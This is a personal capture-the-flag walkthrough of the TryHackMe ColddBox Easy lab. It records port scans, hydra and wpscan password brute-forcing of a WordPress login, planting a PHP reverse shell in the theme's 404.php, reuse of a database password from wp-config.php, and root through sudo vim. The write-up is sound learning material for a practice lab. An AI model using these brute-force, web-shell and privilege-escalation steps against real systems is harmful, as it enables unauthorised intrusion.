### Nmap

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine

4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ebf98c09bc536808c96e8969565973b (RSA)
|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


```
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
```

### HTTP

- feroxbuster gives
```
301        9l       28w      317c http://10.10.75.136/wp-content
301        0l        0w        0c http://10.10.75.136/index.php
200       65l      187w     2547c http://10.10.75.136/wp-login.php
301        9l       28w      318c http://10.10.75.136/wp-includes
200       95l      835w     7173c http://10.10.75.136/readme.html
200        5l       15w      135c http://10.10.75.136/wp-trackback.php
301        9l       28w      315c http://10.10.75.136/wp-admin
301        9l       28w      313c http://10.10.75.136/hidden
```

- interesting ones are
/wp-loign.php
/hidden

```
U-R-G-E-N-T 
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

/wp-includes/


- I am struggling to get the login cred's here, finding nothing in these resources
- Used this writeup https://apjone.uk/tryhackme-colddboxeasy/


- Used this hydra command as per the write up

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/colddbox]
└──╼ $hydra -L wpusers -P /usr/share/wordlists/rockyou.txt 10.10.75.136 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location
```

- THis was taking a lot of time so start another attack vector using wpscan

```
wpscan --no-banner --url http://10.10.214.134 --usernames hugo,c0ldd,philip --passwords /opt/rockyou.txt
```
- this was also taking a lot of time, post that i had multiple ways to get a shell, 1st is changeing the contents of 404.php to php reverse shell

- I used multiple writeups to find which is the bet way to get the creds, One of the reference password lists I found are `SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt`

```
─[✗]─[glack@parrot]─[~]
└──╼ $wpscan --no-banner --url http://10.10.75.136 --usernames hugo,c0ldd,philip --passwords /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

- it was still taking lot of time so used the writeup for cred and they are
```
c0ldd
9876543210
```

### Shell

- Here we can edit the 404.php login page with our custom one, and so i replaced current one with php-pentestmoneky-reverse-shell.php 
- It did not working and i was relying on the write up too much , will continue this tomorrow

- Continuing where i left off, changed the conents of 404.php but with port 9992 this time


- After this i went on the main page `http://10.10.75.99/` and clicked on `# The ColddBox is here`. The url changed to `http://10.10.75.99/?p=1`, but since i wanted to generate an error 404 so the server processes the reverse shell that i injected i changed the url to `http://10.10.75.99/?p=2`
- started a netcat listener and got a shell

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Priv Esc

- Looking around i find this in `www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php`
```
** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');
```

- tried this password for user c0ldd and it worked
```
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ 
```

- found the user flag
```
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

- user is able to run these binaries as sudo

```
(root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp

```


- i used the [[Sudo - NOPASSWD vi filename]] method to get root and the flag

```
root@ColddBox-Easy:/root# cat root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

```

